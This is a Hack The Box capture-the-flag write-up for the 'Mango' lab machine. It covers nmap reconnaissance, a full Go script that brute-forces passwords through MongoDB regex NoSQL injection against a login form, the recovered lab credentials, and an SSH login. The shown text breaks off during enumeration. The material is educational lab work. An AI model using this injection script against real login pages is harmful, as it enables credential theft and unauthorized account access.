<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="description" content="Hack The Box For Mango Machine"><title>Hack The Box Write Up - Mango | zRyuki</title><meta name="generator" content="Jekyll v4.0.0" /><meta property="og:title" content="Hack The Box Write Up - Mango" /><meta name="author" content="zRyuki" /><meta property="og:locale" content="en_US" /><meta name="description" content="Hack The Box For Mango Machine" /><meta property="og:description" content="Hack The Box For Mango Machine" /><link rel="canonical" href="https://zeroryuki.github.io/posts/mango/" /><meta property="og:url" content="https://zeroryuki.github.io/posts/mango/" /><meta property="og:site_name" content="zRyuki" /><meta property="og:image" content="https://zeroryuki.github.io/img/mango/badge.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-04-17T21:34:29+08:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zeroryuki.github.io/img/mango/badge.png" /><meta property="twitter:title" content="Hack The Box Write Up - Mango" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@zRyuki" /><meta name="google-site-verification" content="uR4O3tdC8ptzD19y4h81kQmgw4DIjwMC-FIW5gIrfkM" /> <script type="application/ld+json"> {"headline":"Hack The Box Write Up - Mango","dateModified":"2020-04-17T21:34:29+08:00","datePublished":"2020-04-17T21:34:29+08:00","author":{"@type":"Person","name":"zRyuki"},"description":"Hack The Box For Mango Machine","mainEntityOfPage":{"@type":"WebPage","@id":"https://zeroryuki.github.io/posts/mango/"},"image":"https://zeroryuki.github.io/img/mango/badge.png","@type":"BlogPosting","url":"https://zeroryuki.github.io/posts/mango/","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/zeroryuki/ © 2019 zRyuki Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/icons.css"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/custom.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script> window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>'); </script> <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script> <script src="/assets/js/dist/commons.js" async></script><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><meta content="zRyuki" property="og:site_name"><meta content="Hack The Box Write Up - Mango" property="og:title"><meta content="article" property="og:type"><meta content="Hack The Box For Mango Machine" property="og:description"><meta content="https://zeroryuki.github.io/posts/mango/" property="og:url"><meta content="2020-04-17T21:34:29+08:00" property="article:published_time"><meta content="https://zeroryuki.github.io/about/" property="article:author"><meta content="https://zeroryuki.github.io/img/mango/badge.png" property="og:image"><meta content="machine" property="article:section"><meta content="htb" property="article:tag"><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="https://avatars2.githubusercontent.com/u/34531838" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">zRyuki</a></div><div id="site-subtitle" class="font-italic">Systems were built to be owned</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/zeroryuki" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="javascript:window.open('mailto:' + ['zeroryuki','gmail.com'].join('@'))"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" target="_blank"> <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box Write Up - Mango</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box Write Up - Mango</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Fri, Apr 17, 2020, 9:34 PM +0800"> Apr 17, 2020 <i class="unloaded">2020-04-17T21:34:29+08:00</i> </span> by <span class="author"> zRyuki </span></div></div><div class="row"><div class="col-lg-6"> <img src="/img/mango/icon.png"></div><div class="col-lg-5"><h2 data-toc-skip class="text-center">mango</h2><p></p><table class="table table-hover table-striped"><tbody><tr><td class="text-right">OS:<td> <img src="/img/Linux.png" height="15"> Linux<tr><td class="text-right">Difficulty:<td> <span class="text-warning bold"> Medium</span><tr><td class="text-right">Points:<td><span class="text-success">30</span><tr><td class="text-right">Release:<td>26 Oct 2019<tr><td class="text-right">IP:<td>10.10.10.162</table></div></div><div class="post-content"><h2 id="info-gathering">Info Gathering</h2><h3 id="nmap">Nmap</h3><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>Nmap 7.80SVN scan initiated Mon Dec 23 04:57:31 2019 as: nmap <span class="nt">-vv</span> <span class="nt">--reason</span> <span class="nt">-Pn</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">--version-all</span> <span class="nt">-oN</span> /home/z3r0/CTF/HTB/Machine/Mango/scans/_quick_tcp_nmap.txt <span class="nt">-oX</span> /home/z3r0/CTF/HTB/Machine/Mango/scans/xml/_quick_tcp_nmap.xml 10.10.10.162
<span class="go">Nmap scan report for 10.10.10.162
Host is up, received user-set (0.18s latency).
Scanned at 2019-12-23 04:57:32 +08 for 45s
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT    STATE SERVICE  REASON  VERSION
</span><span class="gp">22/tcp  open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXYCdNRHET98F1ZTM+H8yrD9KXeRjvIk9e78JkHdzcqCq6zcvYIqEZReb3FSCChJ9mxK6E6vu5xBY7R6Gi0V31dx0koyaieEMd67PU+9UcjaAujbDS3UgYzySN+c5GV/ssmA6wWHu4zz+k+qztqdYFPh0/TgrC/wNPWHOKdpivgoyk3+F/retyGdKUNGjypXrw6v1faHiLOIO+zNHorxB304XmSLEFswiOS8UsjplIbud2KhWPEkY4s4FyjlpfpVdgPljbjijm7kcPNgpTXLXE51oNE3Q5w7ufO5ulo3Pqm0x+4d+SEpCE4g0+Yb020zK+JlKsp2tFJyLqTLan1buN
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqSZ4iBMzBrw2lEFKYlwO2qmw0WPf76ZhnvWGK+LJcHxvNa4OQ/hGuBWCjVlTcMbn1Te7D8jGwPgbcVpuaEld8=
|   256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB1sFdLYacK+1f4J+i+NCAhG+bj8xzzydNhqA1Ndo/xt
80/tcp  open  http     syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN/localityName=None/emailAddress=admin@mango.htb/organizationalUnitName=None
| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN/localityName=None/emailAddress=admin@mango.htb/organizationalUnitName=None
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-27T14:21:19
| Not valid after:  2020-09-26T14:21:19
| MD5:   b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6
| SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95
| -----BEGIN CERTIFICATE-----
| MIIEAjCCAuqgAwIBAgIJAK5QiSmoBvEyMA0GCSqGSIb3DQEBCwUAMIGVMQswCQYD
| VQQGEwJJTjENMAsGA1UECAwETm9uZTENMAsGA1UEBwwETm9uZTEXMBUGA1UECgwO
| TWFuZ28gUHJ2IEx0ZC4xDTALBgNVBAsMBE5vbmUxIDAeBgNVBAMMF3N0YWdpbmct
| b3JkZXIubWFuZ28uaHRiMR4wHAYJKoZIhvcNAQkBFg9hZG1pbkBtYW5nby5odGIw
| HhcNMTkwOTI3MTQyMTE5WhcNMjAwOTI2MTQyMTE5WjCBlTELMAkGA1UEBhMCSU4x
| DTALBgNVBAgMBE5vbmUxDTALBgNVBAcMBE5vbmUxFzAVBgNVBAoMDk1hbmdvIFBy
| diBMdGQuMQ0wCwYDVQQLDAROb25lMSAwHgYDVQQDDBdzdGFnaW5nLW9yZGVyLm1h
| bmdvLmh0YjEeMBwGCSqGSIb3DQEJARYPYWRtaW5AbWFuZ28uaHRiMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5fimSfgq3xsdUkZ6dcbqGPDmCAJJBOK2
| f5a25At3Ht5r1SjiIuvovDSmMHjVmlbF6qX7C6f7Um+1Vtv/BinZfpuMEesyDH0V
| G/4X5r6o1GMfrvjvAXQ2cuVEIxHGH17JM6gKKEppnguFwVMhC4/KUIjuaBXX9udA
| 9eaFJeiYEpdfSUVysoxQDdiTJhwyUIPnsFrf021nVOI1/TJkHAgLzxl1vxrMnwrL
| 2fLygDt1IQN8UhGF/2UTk3lVfEse2f2kvv6GbmjxBGfWCNA/Aj810OEGVMiS5SLr
| arIXCGVl953QCD9vi+tHB/c+ICaTtHd0Ziu/gGbdKdCItND1r9kOEQIDAQABo1Mw
| UTAdBgNVHQ4EFgQUha2bBOZXo4EyfovW+pvFLGVWBREwHwYDVR0jBBgwFoAUha2b
| BOZXo4EyfovW+pvFLGVWBREwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsF
| AAOCAQEAmyhYweHz0az0j6UyTYlUAUKY7o/wBHE55UcekmWi0XVdIseUxBGZasL9
| HJki3dQ0mOEW4Ej28StNiDKPvWJhTDLA1ZjUOaW2Jg20uDcIiJ98XbdBvSgjR6FJ
| JqtPYnhx7oOigKsBGYXXYAxoiCFarcyPyB7konNuXUqlf7iz2oLl/FsvJEl+YMgZ
| YtrgOLbEO6/Lot/yX9JBeG1z8moJ0g+8ouCbUYI1Xcxipp0Cp2sK1nrfHEPaSjBB
| Os2YQBdvVXJau7pt9zJmPVMhrLesf+bW5CN0WpC/AE1M1j6AfkX64jKpIMS6KAUP
| /UKaUcFaDwjlaDEvbXPdwpmk4vVWqg==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Mon Dec 23 04:58:17 2019 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>46.36 seconds
</pre></table></code></div></div><p>From Nmap scan output:</p><ol><li>Open port: <strong>22, 80, 443</strong></li><li>Subdomain name: <strong>staging-order.mango.htb</strong></li></ol><p>I put the subdomain name to my hosts file. I then just go check the website on port 80 for that subdomain.</p><h3 id="website">Website</h3><p>I got login page in the subdomain.</p><p><img src="/img/mango/2020-04-17-21-54-46.png" alt="" /></p><p>After checking it around, i cant find anything to get in. I just go to the main domain then. With port 80 or http protocol, got 404 error, so I just use https instead, and got some ui.</p><p><img src="/img/mango/2020-04-17-22-12-03.png" alt="" /></p><p>And here the ui for analytics link at the top nav.</p><p><img src="/img/mango/2020-04-17-22-07-56.png" alt="" /></p><p>I been in the web for quite long time, and this one got my attention, <code class="highlighter-rouge">elasticsearch</code></p><p><img src="/img/mango/2020-04-18-09-42-39.png" alt="" /></p><p>seems it wont do anything good for now, so I google for elasticsearch exploit, and led to NoQSL database info and mongoDB listed common used for elasticsearch. Sounds fishy right.</p><p>With that info, i just try my wild guess that login creds earlier also stored in that db. Mongodb got a CVE which vuln to bruteforce attack. I tried with go script for this task.</p><h2 id="exploitation">Exploitation</h2><h3 id="bruteforce-in-go">Bruteforce in go</h3><div class="language-go highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
</pre><td class="rouge-code"><pre><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
	<span class="s">"os"</span>
	<span class="s">"fmt"</span>
	<span class="s">"net/http"</span>
	<span class="s">"net/url"</span>
	<span class="s">"strings"</span>
<span class="p">)</span>

<span class="c">// Build a rune slice of printable ASCII characters, excluding some special characters that would break the regex</span>
<span class="k">func</span> <span class="n">buildPrintable</span><span class="p">()</span> <span class="p">[]</span><span class="kt">rune</span> <span class="p">{</span>
	<span class="k">var</span> <span class="n">p</span> <span class="p">[]</span><span class="kt">rune</span>
	<span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="sc">'0'</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="sc">'9'</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
		<span class="n">p</span> <span class="o">=</span> <span class="nb">append</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="sc">'A'</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="sc">'Z'</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
		<span class="n">p</span> <span class="o">=</span> <span class="nb">append</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="sc">'a'</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="sc">'z'</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
		<span class="n">p</span> <span class="o">=</span> <span class="nb">append</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="n">special</span> <span class="o">:=</span> <span class="s">"~&gt;][&lt;&gt;!@#%^()@_{}"</span>
	<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">c</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">special</span> <span class="p">{</span>
		<span class="n">p</span> <span class="o">=</span> <span class="nb">append</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">p</span>
<span class="p">}</span>

<span class="c">// Post form data with URL-encoded payload</span>
<span class="k">func</span> <span class="n">makePostRequest</span><span class="p">(</span><span class="n">data</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">int</span> <span class="p">{</span>
	<span class="n">u</span> <span class="o">:=</span> <span class="s">"http://staging-order.mango.htb"</span>

	<span class="n">req</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">http</span><span class="o">.</span><span class="n">NewRequest</span><span class="p">(</span><span class="s">"POST"</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span> <span class="n">strings</span><span class="o">.</span><span class="n">NewReader</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
	<span class="n">req</span><span class="o">.</span><span class="n">Header</span><span class="o">.</span><span class="n">Set</span><span class="p">(</span><span class="s">"Content-Type"</span><span class="p">,</span> <span class="s">"application/x-www-form-urlencoded"</span><span class="p">)</span>

	<span class="n">client</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">http</span><span class="o">.</span><span class="n">Client</span><span class="p">{</span>
		<span class="c">// Prevent redirects</span>
		<span class="n">CheckRedirect</span><span class="o">:</span> <span class="k">func</span><span class="p">(</span><span class="n">req</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">,</span> <span class="n">via</span> <span class="p">[]</span><span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
			<span class="k">return</span> <span class="n">http</span><span class="o">.</span><span class="n">ErrUseLastResponse</span>
		<span class="p">},</span>
	<span class="p">}</span>
	<span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">client</span><span class="o">.</span><span class="n">Do</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">defer</span> <span class="n">resp</span><span class="o">.</span><span class="n">Body</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>

	<span class="k">return</span> <span class="n">resp</span><span class="o">.</span><span class="n">StatusCode</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">buildPostData</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">payload</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="n">data</span> <span class="o">:=</span> <span class="n">url</span><span class="o">.</span><span class="n">Values</span><span class="p">{}</span>
	<span class="n">data</span><span class="o">.</span><span class="n">Set</span><span class="p">(</span><span class="s">"username"</span><span class="p">,</span> <span class="n">victim</span><span class="p">)</span>
	<span class="n">data</span><span class="o">.</span><span class="n">Set</span><span class="p">(</span><span class="s">"password[$regex]"</span><span class="p">,</span> <span class="n">payload</span><span class="o">+</span><span class="s">".*"</span><span class="p">)</span>

	<span class="k">return</span> <span class="n">data</span><span class="o">.</span><span class="n">Encode</span><span class="p">()</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">printable</span> <span class="o">:=</span> <span class="n">buildPrintable</span><span class="p">()</span>
	<span class="n">victim</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">1</span><span class="p">]</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"[*] Bruteforcing password for: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">victim</span><span class="p">)</span>

	<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">a</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">printable</span> <span class="p">{</span>
		<span class="n">flag</span> <span class="o">:=</span> <span class="kt">string</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
		<span class="n">restart</span> <span class="o">:=</span> <span class="no">true</span>

		<span class="k">for</span> <span class="n">restart</span> <span class="p">{</span>
			<span class="n">restart</span> <span class="o">=</span> <span class="no">false</span>

			<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">c</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">printable</span> <span class="p">{</span>
				<span class="n">payload</span> <span class="o">:=</span> <span class="n">flag</span> <span class="o">+</span> <span class="kt">string</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
				<span class="n">data</span> <span class="o">:=</span> <span class="n">buildPostData</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

				<span class="n">statusCode</span> <span class="o">:=</span> <span class="n">makePostRequest</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

				<span class="k">if</span> <span class="n">statusCode</span> <span class="o">==</span> <span class="m">302</span> <span class="p">{</span>
					<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
					<span class="n">flag</span> <span class="o">=</span> <span class="n">payload</span>
					<span class="n">restart</span> <span class="o">=</span> <span class="no">true</span>
				<span class="p">}</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><h3 id="admin-cred">Admin Cred</h3><p><img src="/img/mango/2020-04-18-06-38-39.png" alt="" /></p><p>After a long run script, i tried every single output, for login page with username admin. Below is the working cred</p><p>username: <code class="highlighter-rouge">admin</code></p><p>password: <code class="highlighter-rouge">t9KcS3&gt;!0B#2</code></p><p>I landed on this page. WTH! Looking every possible page, and source code, nothing good.</p><p><img src="/img/mango/2020-04-17-23-25-38.png" alt="" /></p><h3 id="mango-cred">Mango Cred</h3><p>Again, i just tried the bruteforce script again with the machine name, and yeah got output. So repeat the step again, tried every ouput.</p><p><img src="/img/mango/2020-04-17-23-30-21.png" alt="" /></p><p>The working cred.</p><p>admin: <code class="highlighter-rouge">mango</code></p><p>password: <code class="highlighter-rouge">h3mXK8RhU~f{]f5H</code></p><p>But landed on the same webpage. This led me to nothing. As a habit, try credential u found on all available door. In this case, SSH!</p><h3 id="ssh">SSH</h3><p>Got 2 creds to try, I go with admin first. But failed. Just try with mango next.</p><p><img src="/img/mango/2020-04-17-23-29-09.png" alt="" /></p><p>Hoyeah, SSH with mango user works. Next, just do basic enumeration.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">mango@mango:~$</span><span class="w"> </span><span class="nb">pwd</span>
<span class="go">/home/mango
</span><span class="gp">mango@mango:~$</span><span class="w"> </span><span class="nb">ls</span>
<span class="gp">mango@mango:~$</span><span class="w"> </span><span class="nb">ls</span> /home/admin
<span class="gp">mangomango@mango:~$</span><span class="w"> </span><span class="nb">ls</span> ../admin/user.txt
